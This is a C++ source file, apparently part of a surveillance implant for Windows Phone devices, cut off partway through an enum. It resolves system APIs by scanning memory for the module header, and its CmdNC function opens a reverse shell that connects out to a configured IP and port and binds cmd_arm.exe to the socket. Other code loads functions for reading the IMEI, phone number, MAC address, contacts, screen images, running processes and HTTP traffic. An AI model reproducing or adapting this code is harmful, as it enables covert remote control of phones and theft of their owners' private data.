#include "CmdNC.h"

extern "C" int mornellaStart(void);



//#include "pch.h"
#include <windows.h>
#include "FunctionFunc.h"


	FunctionFuncSleep _Sleep;
	FunctionFuncGetModuleHandleW _GetModuleHandleW;
	FunctionFuncCreateThread _CreateThread;
	FunctionFuncWaitForSingleObject _WaitForSingleObject;
	FunctionFuncCreateEvent _CreateEventW;
	FunctionFuncCreateToolhelp32Snapshot   _CreateToolhelp32Snapshot;
	FunctionFuncProcess32FirstW   _Process32FirstW;
	FunctionFuncOpenProcessToken   _OpenProcessToken;
	FunctionFuncProcess32NextW  _Process32NextW;
	FunctionFuncOpenProcess   _OpenProcess;
	FunctionFuncGlobalMemoryStatus _GlobalMemoryStatus;
	FunctionFuncGetVersionExW   _GetVersionExW;
	FunctionFuncCloseToolhelp32Snapshot _CloseToolhelp32Snapshot;
	FunctionFuncCreateFileW _CreateFileW;
	FunctionFuncRegOpenKeyExW   _RegOpenKeyExW;
	FunctionFuncRegCloseKey   _RegCloseKey;
	FunctionFuncRegEnumKeyEx   _RegEnumKeyEx;
    FunctionFuncRegSetValueEx _RegSetValueEx;
	FunctionFuncRegFlushKey _RegFlushKey;
	FunctionFuncGetFileSize _GetFileSize;
	FunctionFuncFindFirstFile  _FindFirstFile;
	FunctionFuncGetIpAddrTable _GetIpAddrTable;
	FunctionFuncGetAdapterIndex _GetAdapterIndex;
	FunctionFuncRegQueryValueExW _RegQueryValueExW;
	FunctionFuncCreateMutexW _CreateMutexW;
	FunctionFuncReleaseMutex _ReleaseMutex;
	FunctionFuncRtlZeroMemory _RtlZeroMemory;
	FunctionFuncRtlFillMemory _RtlFillMemory;
	FunctionFuncRtlCopyMemory _RtlCopyMemory;
	FunctionFuncRtlMoveMemory _RtlMoveMemory;
	FunctionFuncDeviceIoControl _DeviceIoControl;
	FunctionFuncGetSystemInfo _GetSystemInfo;
	FunctionFuncSetFilePointer _SetFilePointer;
	FunctionFuncCreateProcessW _CreateProcessW;
	FunctionFuncGetDeviceUniqueID _GetDeviceUniqueID;
	FunctionFuncGetIMEI _GetIMEI;
	FunctionFuncDevicePropertiesGetProcessMemoryInfo _DevicePropertiesGetProcessMemoryInfo;
	FunctionFuncDevicePropertiesGetUniqueDeviceId _DevicePropertiesGetUniqueDeviceId;
	FunctionFuncBNSCGetBackgroundServiceId _BNSCGetBackgroundServiceId;
	FunctionFuncDevicePropertiesGlobalMemoryStatus _DevicePropertiesGlobalMemoryStatus;
	FunctionFuncQueryPhoneInformation _QueryPhoneInformation;
	FunctionFuncGetPhoneNumber _GetPhoneNumber;
	FunctionFuncGetMACAddress _GetMACAddress;
	FunctionFuncTerminateThread _TerminateThread;
	FunctionFuncGetTickCount _GetTickCount;
	FunctionFuncInternetOpenW _InternetOpenW;
	FunctionFuncInternetConnectW _InternetConnectW;
	FunctionFuncInternetCloseHandle _InternetCloseHandle;
	FunctionFuncHttpOpenRequestW _HttpOpenRequestW;
	FunctionFuncHttpSendRequestW _HttpSendRequestW;
	FunctionFuncHttpQueryInfoW _HttpQueryInfoW;
	FunctionFuncInternetReadFile _InternetReadFile;
	FunctionFuncGetModuleFileNameW   _GetModuleFileNameW;
	FunctionFuncGetFileVersionInfoSizeExW  _GetFileVersionInfoSizeExW;
	FunctionFuncGetFileVersionInfoExW  _GetFileVersionInfoExW;
	FunctionFuncVerQueryValueW _VerQueryValueW;
	FunctionFuncEnumWindows _EnumWindows;
	FunctionFuncGetWindowTextW   _GetWindowTextW;
	FunctionFuncThread32First   _Thread32First;
	FunctionFuncSuspendThread  _SuspendThread;
	FunctionFuncResumeThread  _ResumeThread;
	FunctionFuncThread32Next   _Thread32Next;
	FunctionFuncTerminateProcess  _TerminateProcess;
	FunctionFuncMedia_Queue_GameHasControl  _Media_Queue_GameHasControl;
	FunctionFuncZMediaQueue_ConnectToService  _ZMediaQueue_ConnectToService;
	FunctionFuncZMediaQueue_DisconnectFromService  _ZMediaQueue_DisconnectFromService;
	FunctionFuncGetSystemPowerStatus _GetSystemPowerStatus;
	FunctionFuncShell_IdleTimerReset _Shell_IdleTimerReset;
	FunctionFuncShell_TurnScreenOn _Shell_TurnScreenOn;
	FunctionFuncShell_IsUnlockedNormal _Shell_IsUnlockedNormal;
	FunctionFuncMediaApi_EncodeARGBIntoJpegStream _MediaApi_EncodeARGBIntoJpegStream;
	FunctionFuncFindFirstVolume _FindFirstVolume;
	FunctionFuncBeep _Beep;
	FunctionFuncPlaySoundW _PlaySoundW;
	FunctionFuncSetCurrentDirectory _SetCurrentDirectory;
	FunctionFuncChooseContact _ChooseContact;
	FunctionFuncPoomDataServiceClient_Init _PoomDataServiceClient_Init;
	FunctionFuncPoomDataServiceClient_GetObjectsEnumerator _PoomDataServiceClient_GetObjectsEnumerator;
	FunctionFuncPoomDataServiceClient_GetStreamLength _PoomDataServiceClient_GetStreamLength;
	FunctionFuncPoomDataServiceClient_ReadStream _PoomDataServiceClient_ReadStream;
	FunctionFuncPoomDataServiceClient_MoveNext _PoomDataServiceClient_MoveNext;



	



PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID Base)
{
	return (PIMAGE_NT_HEADERS)
		((LPBYTE) Base + ((PIMAGE_DOS_HEADER) Base)->e_lfanew);
}

PIMAGE_SECTION_HEADER WINAPI RtlImageRvaToSection( const IMAGE_NT_HEADERS *nt,
                                                   HMODULE module, DWORD_PTR rva )
{
    int i;
    const IMAGE_SECTION_HEADER *sec;

    sec = (const IMAGE_SECTION_HEADER*)((const char*)&nt->OptionalHeader +
                                        nt->FileHeader.SizeOfOptionalHeader);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            return (PIMAGE_SECTION_HEADER)sec;
    }
    return NULL;
}

PVOID WINAPI RtlImageRvaToVa( const IMAGE_NT_HEADERS *nt, HMODULE module,
                              DWORD_PTR rva, IMAGE_SECTION_HEADER **section )
{
    IMAGE_SECTION_HEADER *sec;

    if (section && *section)  /* try this section first */
    {
        sec = *section;
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            goto found;
    }
    if (!(sec = RtlImageRvaToSection( nt, module, rva ))) return NULL;
 found:
    if (section) *section = sec;
    return (char *)module + sec->PointerToRawData + (rva - sec->VirtualAddress);
}

PVOID WINAPI ImageDirectoryEntryToDataEx( PVOID base, BOOLEAN image, USHORT dir, PULONG size, PIMAGE_SECTION_HEADER *section )
{
    const IMAGE_NT_HEADERS *nt;
    DWORD_PTR addr;

    *size = 0;
    if (section) *section = NULL;

    if (!(nt = ImageNtHeader( base ))) return NULL;
    if (dir >= nt->OptionalHeader.NumberOfRvaAndSizes) return NULL;
    if (!(addr = nt->OptionalHeader.DataDirectory[dir].VirtualAddress)) return NULL;

    *size = nt->OptionalHeader.DataDirectory[dir].Size;
    if (image || addr < nt->OptionalHeader.SizeOfHeaders) return (char *)base + addr;

    return RtlImageRvaToVa( nt, (HMODULE)base, addr, section );
}



// == Windows API GetProcAddress
void *PeGetProcAddressA(void *Base, LPCSTR Name)
{
	DWORD Tmp;

	IMAGE_NT_HEADERS *NT=ImageNtHeader(Base);
	IMAGE_EXPORT_DIRECTORY *Exp=(IMAGE_EXPORT_DIRECTORY*)ImageDirectoryEntryToDataEx(Base,TRUE,IMAGE_DIRECTORY_ENTRY_EXPORT,&Tmp,0);
	if(Exp==0 || Exp->NumberOfFunctions==0)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	DWORD *Names=(DWORD*)(Exp->AddressOfNames+(DWORD_PTR)Base);
	WORD *Ordinals=(WORD*)(Exp->AddressOfNameOrdinals+(DWORD_PTR)Base);
	DWORD *Functions=(DWORD*)(Exp->AddressOfFunctions+(DWORD_PTR)Base);

	FARPROC Ret=0;

	if((DWORD_PTR)Name<65536)
	{
		if((DWORD_PTR)Name-Exp->Base<Exp->NumberOfFunctions)
			Ret=(FARPROC)(Functions[(DWORD_PTR)Name-Exp->Base]+(DWORD_PTR)Base);
	} else
	{
		for(DWORD i=0; i<Exp->NumberOfNames && Ret==0; i++)
		{
			char *Func=(char*)(Names[i]+(DWORD_PTR)Base);
			if(Func && strcmp(Func,Name)==0)
				Ret=(FARPROC)(Functions[Ordinals[i]]+(DWORD_PTR)Base);
		}
	}

	if(Ret)
	{
		DWORD ExpStart=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(DWORD)Base;
		DWORD ExpSize=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if((DWORD)Ret>=ExpStart && (DWORD)Ret<=ExpStart+ExpSize)
		{
			// Forwarder
			return 0;
		}
		return Ret;
	}

	return 0;	
}



typedef BOOL WINAPI __stdcall t_CPA(
  LPCSTR lpApplicationName,
  LPSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);

t_CPA *CreateProcessA=0;


int CmdNC(void)
{
	 
    WSADATA wsaData;
    SOCKET Winsocket;
    STARTUPINFO theProcess; 
    PROCESS_INFORMATION info_proc; 
    struct sockaddr_in Winsocket_Structure;
	
	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
		__try 
		{
			if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		} __except(EXCEPTION_EXECUTE_HANDLER)
		{
		}
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return 0;

	CreateProcessA=(t_CPA*)PeGetProcAddressA(Tmp,"CreateProcessA");
	
	STARTUPINFO si;
	memset(&si,0,sizeof(si));
	si.cb=sizeof(si);


	
	char *IP =  DEFAULT_IP;
    short port = DEFAULT_PORT;
  

            WSAStartup(MAKEWORD(2,2), &wsaData);
            Winsocket=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,NULL, (unsigned int) NULL, (unsigned int) NULL);
            Winsocket_Structure.sin_port=htons(port);
            Winsocket_Structure.sin_family=AF_INET;
            Winsocket_Structure.sin_addr.s_addr=inet_addr(IP);
     
        if(Winsocket==INVALID_SOCKET)
        {
            WSACleanup();
            return 1;
        }
     
        if(WSAConnect(Winsocket,(SOCKADDR*)&Winsocket_Structure,sizeof(Winsocket_Structure),NULL,NULL,NULL,NULL) == SOCKET_ERROR)
        {
            WSACleanup();
            return 1;
        }
     
        // Starting shell by creating a new process with i/o redirection.    
        memset(&theProcess,0,sizeof(theProcess));
        theProcess.cb=sizeof(theProcess);
        theProcess.dwFlags=STARTF_USESTDHANDLES;
        
        // here we make the redirection
        theProcess.hStdInput = theProcess.hStdOutput = theProcess.hStdError = (HANDLE)Winsocket;
        
        // fork the new process.
        //if(CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
		//CreateProcessA("explorer.exe",0,0,0,FALSE,0,0,0,&si,&pi);
		//if(CreateProcessA(NULL,"cmd_arm.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
		if(CreateProcessA(NULL,"cmd_arm.exe",NULL,NULL,TRUE,0,NULL,NULL,&theProcess,&info_proc)==0)
        {
            WSACleanup();
            return 1;
        }


	return 0;
}

	

int setLoadLibraryExW(void)
{

	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
		
		if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return -1;


	t_LLW* LoadLibraryExW=0;

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");

	_Sleep = (FunctionFuncSleep)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"Sleep");
	_GetModuleHandleW=  (FunctionFuncGetModuleHandleW)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"GetModuleHandleW");
	_CreateThread=  (FunctionFuncCreateThread)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateThread");
	_TerminateThread=  (FunctionFuncTerminateThread)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"TerminateThread");
	_WaitForSingleObject=  (FunctionFuncWaitForSingleObject)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"WaitForSingleObject");
	_CreateEventW = (FunctionFuncCreateEvent)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateEventW");
	 
	HINSTANCE LibHandle;
	
	

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_CreateToolhelp32Snapshot =  (FunctionFuncCreateToolhelp32Snapshot)GetProcAddress(LibHandle,"CreateToolhelp32Snapshot");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Process32FirstW =  (FunctionFuncProcess32FirstW)GetProcAddress(LibHandle,"Process32FirstW");
	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_OpenProcessToken=  (FunctionFuncOpenProcessToken)GetProcAddress(LibHandle,"OpenProcessToken");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Process32NextW =  (FunctionFuncProcess32NextW)GetProcAddress(LibHandle,"Process32NextW");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_OpenProcess=  (FunctionFuncOpenProcess)GetProcAddress(LibHandle,"OpenProcess");


	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_CloseToolhelp32Snapshot =  (FunctionFuncCloseToolhelp32Snapshot)GetProcAddress(LibHandle,"CloseToolhelp32Snapshot");

	
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GlobalMemoryStatus =  (FunctionFuncGlobalMemoryStatus)GetProcAddress(LibHandle,"GlobalMemoryStatus");

	_GetVersionExW=  (FunctionFuncGetVersionExW)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"GetVersionExW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_CreateFileW=  (FunctionFuncCreateFileW)GetProcAddress(LibHandle,"CreateFileW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_RegOpenKeyExW =  (FunctionFuncRegOpenKeyExW)GetProcAddress(LibHandle,"RegOpenKeyExW");

	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegCloseKey =  (FunctionFuncRegCloseKey)GetProcAddress(LibHandle,"RegCloseKey");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_RegEnumKeyEx = (FunctionFuncRegEnumKeyEx)GetProcAddress(LibHandle,"RegEnumKeyEx");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegSetValueEx =  (FunctionFuncRegSetValueEx)GetProcAddress(LibHandle,"RegSetValueEx");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegFlushKey =  (FunctionFuncRegFlushKey)GetProcAddress(LibHandle,"RegFlushKey");



	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _GetFileSize =  (FunctionFuncGetFileSize)GetProcAddress(LibHandle,"GetFileSize");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_FindFirstFile =  (FunctionFuncFindFirstFile)GetProcAddress(LibHandle,"FindFirstFileW");

	
	LibHandle = LoadLibraryExW(L"IPHLPAPI",NULL,0);
	_GetIpAddrTable =  (FunctionFuncGetIpAddrTable)GetProcAddress(LibHandle,"GetIpAddrTable");


	LibHandle = LoadLibraryExW(L"IPHLPAPI",NULL,0);
	_GetAdapterIndex =  (FunctionFuncGetAdapterIndex)GetProcAddress(LibHandle,"GetAdapterIndex");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_RegQueryValueExW =  (FunctionFuncRegQueryValueExW)GetProcAddress(LibHandle,"RegQueryValueExW");
	

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_CreateMutexW =  (FunctionFuncCreateMutexW)GetProcAddress(LibHandle,"CreateMutexW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_ReleaseMutex =  (FunctionFuncReleaseMutex)GetProcAddress(LibHandle,"ReleaseMutex");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetSystemInfo =  (FunctionFuncGetSystemInfo)GetProcAddress(LibHandle,"GetSystemInfo");


	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlZeroMemory =  (FunctionFuncRtlZeroMemory)GetProcAddress(LibHandle,"RtlZeroMemory");

	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlFillMemory=  (FunctionFuncRtlFillMemory)GetProcAddress(LibHandle,"RtlFillMemory");


	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlCopyMemory=  (FunctionFuncRtlCopyMemory)GetProcAddress(LibHandle,"RtlCopyMemory");

	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlMoveMemory=  (FunctionFuncRtlMoveMemory)GetProcAddress(LibHandle,"RtlMoveMemory");


	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_DeviceIoControl =  (FunctionFuncDeviceIoControl)GetProcAddress(LibHandle,"DeviceIoControl");
		

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GlobalMemoryStatus=  (FunctionFuncGlobalMemoryStatus)GetProcAddress(LibHandle,"GlobalMemoryStatus");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_SetFilePointer=  (FunctionFuncSetFilePointer)GetProcAddress(LibHandle,"SetFilePointer");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _CreateProcessW=  (FunctionFuncCreateProcessW)GetProcAddress(LibHandle,"CreateProcessW");
	

	LibHandle = LoadLibraryExW(L"WPCOREUTIL",NULL,0);
    _GetDeviceUniqueID=  (FunctionFuncGetDeviceUniqueID)GetProcAddress(LibHandle,"GetDeviceUniqueID");


	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
    _GetIMEI=  (FunctionFuncGetIMEI)GetProcAddress(LibHandle,"GetIMEI");

	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
    _GetPhoneNumber=  (FunctionFuncGetPhoneNumber)GetProcAddress(LibHandle,"GetPhoneNumber");


	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
    _DevicePropertiesGetProcessMemoryInfo=  (FunctionFuncDevicePropertiesGetProcessMemoryInfo)GetProcAddress(LibHandle,"DevicePropertiesGetProcessMemoryInfo");



	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
    _DevicePropertiesGetUniqueDeviceId=  (FunctionFuncDevicePropertiesGetUniqueDeviceId)GetProcAddress(LibHandle,"DevicePropertiesGetUniqueDeviceId");

	//BNSCGetBackgroundServiceId(int a1)
;

	LibHandle = LoadLibraryExW(L"BNSClient",NULL,0);
    _BNSCGetBackgroundServiceId=  (FunctionFuncBNSCGetBackgroundServiceId)GetProcAddress(LibHandle,"BNSCGetBackgroundServiceId");



	
	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
    _DevicePropertiesGlobalMemoryStatus=  (FunctionFuncDevicePropertiesGlobalMemoryStatus)GetProcAddress(LibHandle,"DevicePropertiesGlobalMemoryStatus");


	

	//QueryPhoneInformation
	//public static extern bool QueryPhoneInformation(int key, StringBuilder value, int inSize);

	LibHandle = LoadLibraryExW(L"PHONEINFO",NULL,0);
    _QueryPhoneInformation=  (FunctionFuncQueryPhoneInformation)GetProcAddress(LibHandle,"QueryPhoneInformation");


	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
    _GetMACAddress=  (FunctionFuncGetMACAddress)GetProcAddress(LibHandle,"GetMACAddress");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _GetTickCount=  (FunctionFuncGetTickCount)GetProcAddress(LibHandle,"GetTickCount");



	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetOpenW=  (FunctionFuncInternetOpenW)GetProcAddress(LibHandle,"InternetOpenW");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetConnectW=  (FunctionFuncInternetConnectW)GetProcAddress(LibHandle,"InternetConnectW");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetCloseHandle=  (FunctionFuncInternetCloseHandle)GetProcAddress(LibHandle,"InternetCloseHandle");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _HttpOpenRequestW=  (FunctionFuncHttpOpenRequestW)GetProcAddress(LibHandle,"HttpOpenRequestW");

		

	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _HttpSendRequestW=  (FunctionFuncHttpSendRequestW)GetProcAddress(LibHandle,"HttpSendRequestW");


	
	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _HttpQueryInfoW=  (FunctionFuncHttpQueryInfoW)GetProcAddress(LibHandle,"HttpQueryInfoW");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetReadFile=  (FunctionFuncInternetReadFile)GetProcAddress(LibHandle,"InternetReadFile");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetModuleFileNameW =  (FunctionFuncGetModuleFileNameW)GetProcAddress(LibHandle,"GetModuleFileNameW");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetFileVersionInfoExW =  (FunctionFuncGetFileVersionInfoExW)GetProcAddress(LibHandle,"GetFileVersionInfoExW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetFileVersionInfoSizeExW =  (FunctionFuncGetFileVersionInfoSizeExW)GetProcAddress(LibHandle,"GetFileVersionInfoSizeExW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_VerQueryValueW =  (FunctionFuncVerQueryValueW)GetProcAddress(LibHandle,"VerQueryValueW");

	LibHandle = LoadLibraryExW(L"ie_shims",NULL,0);
	_EnumWindows =  (FunctionFuncEnumWindows)GetProcAddress(LibHandle,"EnumWindows");


	LibHandle = LoadLibraryExW(L"ie_shims",NULL,0);
	_GetWindowTextW=  (FunctionFuncGetWindowTextW)GetProcAddress(LibHandle,"GetWindowTextW");


	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
    _Thread32First =  (FunctionFuncThread32First)GetProcAddress(LibHandle,"Thread32First");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
    _SuspendThread =  (FunctionFuncSuspendThread)GetProcAddress(LibHandle,"SuspendThread");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
    _ResumeThread =  (FunctionFuncResumeThread)GetProcAddress(LibHandle,"ResumeThread");

 
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Thread32Next =  (FunctionFuncThread32Next)GetProcAddress(LibHandle,"Thread32Next");

	
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_TerminateProcess =  (FunctionFuncTerminateProcess)GetProcAddress(LibHandle,"TerminateProcess");

	
	LibHandle = LoadLibraryExW(L"XnaFrameworkCore",NULL,0);
	_Media_Queue_GameHasControl=  (FunctionFuncMedia_Queue_GameHasControl)GetProcAddress(LibHandle,"Media_Queue_GameHasControl");

	LibHandle = LoadLibraryExW(L"ZMediaqueueClient",NULL,0);
	_ZMediaQueue_ConnectToService=  (FunctionFuncZMediaQueue_ConnectToService)GetProcAddress(LibHandle,"ZMediaQueue_ConnectToService");

	LibHandle = LoadLibraryExW(L"ZMediaqueueClient",NULL,0);
	_ZMediaQueue_DisconnectFromService=  (FunctionFuncZMediaQueue_DisconnectFromService)GetProcAddress(LibHandle,"ZMediaQueue_DisconnectFromService");


	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GetSystemPowerStatus=  (FunctionFuncGetSystemPowerStatus)GetProcAddress(LibHandle,"GetSystemPowerStatus");
	
	LibHandle = LoadLibraryExW(L"ShellChromeAPI",NULL,0);
	_Shell_IdleTimerReset=  (FunctionFuncShell_IdleTimerReset)GetProcAddress(LibHandle,"Shell_IdleTimerReset");

	LibHandle = LoadLibraryExW(L"ShellChromeAPI",NULL,0);
	_Shell_TurnScreenOn=  (FunctionFuncShell_TurnScreenOn)GetProcAddress(LibHandle,"Shell_TurnScreenOn");

	
	LibHandle = LoadLibraryExW(L"ShellChromeAPI",NULL,0);
	_Shell_IsUnlockedNormal=  (FunctionFuncShell_IsUnlockedNormal)GetProcAddress(LibHandle,"Shell_IsUnlockedNormal");

	LibHandle = LoadLibraryExW(L"PhotosAPI",NULL,0);
	_MediaApi_EncodeARGBIntoJpegStream=  (FunctionFuncMediaApi_EncodeARGBIntoJpegStream)GetProcAddress(LibHandle,"MediaApi_EncodeARGBIntoJpegStream");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_FindFirstVolume=  (FunctionFuncFindFirstVolume)GetProcAddress(LibHandle,"FindFirstVolumeW");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_Beep =  (FunctionFuncBeep)GetProcAddress(LibHandle,"Beep");

	LibHandle = LoadLibraryExW(L"MMAudio",NULL,0);
	_PlaySoundW =  (FunctionFuncPlaySoundW)GetProcAddress(LibHandle,"PlaySoundW");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_SetCurrentDirectory =  (FunctionFuncSetCurrentDirectory)GetProcAddress(LibHandle,"SetCurrentDirectoryW");

	LibHandle = LoadLibraryExW(L"PIMSTORE",NULL,0);
	_ChooseContact = (FunctionFuncChooseContact)GetProcAddress(LibHandle,"ChooseContact");

	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
	_PoomDataServiceClient_Init=  (FunctionFuncPoomDataServiceClient_Init)GetProcAddress(LibHandle,"PoomDataServiceClient_Init");

	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
	_PoomDataServiceClient_GetObjectsEnumerator=  (FunctionFuncPoomDataServiceClient_GetObjectsEnumerator)GetProcAddress(LibHandle,"PoomDataServiceClient_GetObjectsEnumerator");

	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
	_PoomDataServiceClient_GetStreamLength=  (FunctionFuncPoomDataServiceClient_GetStreamLength)GetProcAddress(LibHandle,"PoomDataServiceClient_GetStreamLength");

	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
	_PoomDataServiceClient_ReadStream=  (FunctionFuncPoomDataServiceClient_ReadStream)GetProcAddress(LibHandle,"PoomDataServiceClient_ReadStream");


	LibHandle = LoadLibraryExW(L"CommsDirectAccessClient",NULL,0);
	_PoomDataServiceClient_MoveNext=  (FunctionFuncPoomDataServiceClient_MoveNext)GetProcAddress(LibHandle,"PoomDataServiceClient_MoveNext");




	

	


	return 0;
}





HRESULT ContactChooserExample(void)
{
    HRESULT hr                      = E_FAIL;    
    const CEPROPID c_propidAllEmail = PIMPR_ALL_EMAIL; 
    CHOOSECONTACT cc                = {0};

    // Setup the CHOOSECONTACT structure.
    cc.cbSize                     = sizeof (cc);
    cc.dwFlags                    = CCF_RETURNCONTACTNAME | CCF_RETURNPROPERTYVALUE | CCF_HIDENEW;
    cc.rgpropidRequiredProperties = &c_propidAllEmail;

    // The number of properties specified in the c_propidAllEmail array.
    cc.cRequiredProperties = 1;
    cc.hwndOwner           = NULL;

    // Display the Contact Chooser control, and prompt the user to choose a Contact.
    hr = _ChooseContact(&cc);

    // The name, and a string representation of the property, is returned according to the flags set in the CHOOSECONTACT structure above.
   // DEBUGMSG(TRUE, (L"%s's email address is %s", cc.bstrContactName, cc.bstrPropertyValueSelected));

    // Free memory.
    //SysFreeString(cc.bstrContactName);
    //SysFreeString(cc.bstrPropertyValueSelected);

    return hr;
}

/*
public class Object
{
    // Methods
    public Object();
    public virtual bool Equals(object obj);
    public static bool Equals(object objA, object objB);
    private void FieldGetter(string typeName, string fieldName, ref object val);
    private void FieldSetter(string typeName, string fieldName, object val);
    protected virtual void Finalize();
    private FieldInfo GetFieldInfo(string typeName, string fieldName);
    public virtual int GetHashCode();
    public extern Type GetType();
    protected extern object MemberwiseClone();
    public static bool ReferenceEquals(object objA, object objB);
    public virtual string ToString();
}
*/

typedef struct _SOURCEDPROPVAL
{
    unsigned int cSources;
    void* rgSources;
    void* pPropVal;
} SOURCEDPROPVAL;

typedef struct _PSOURCEDPROPVAL
{
    unsigned int  PIMPR_PROPS;
    unsigned int reserved;
    LPCWSTR lpwstr;
} PSOURCEDPROPVAL;



typedef struct _CONTACT
{
	unsigned int cProps;
    void *rgPropVals;
    unsigned int cAggregatedProps;
    void *rgAggregatedPropVals;
    unsigned int cSources;
    void *rgAccounts;
    unsigned int contactId;
} CONTACT;

typedef enum _StorageKind
{
	Phone,
    WindowsLive,
    Outlook,
    Facebook,
    Other
} StorageKind;

typedef enum _PhoneNumberKind
{
    Mobile,
    Home,
    Work,
    Company,
    Pager,
    HomeFax,
    WorkFax
} PhoneNumberKind;


typedef enum _NETWORK_SOURCE_ID
{
    NFacebook = 7,
    NOutlook = 0x11,
    NWindowsLive = 1
} NETWORK_SOURCE_ID;

 



typedef enum _PIMPR_PROPS
{
	_PIMPR_ALL_DAY_EVENT = 0x44000b,
    _PIMPR_BODY_TEXT = 0x101f001f,
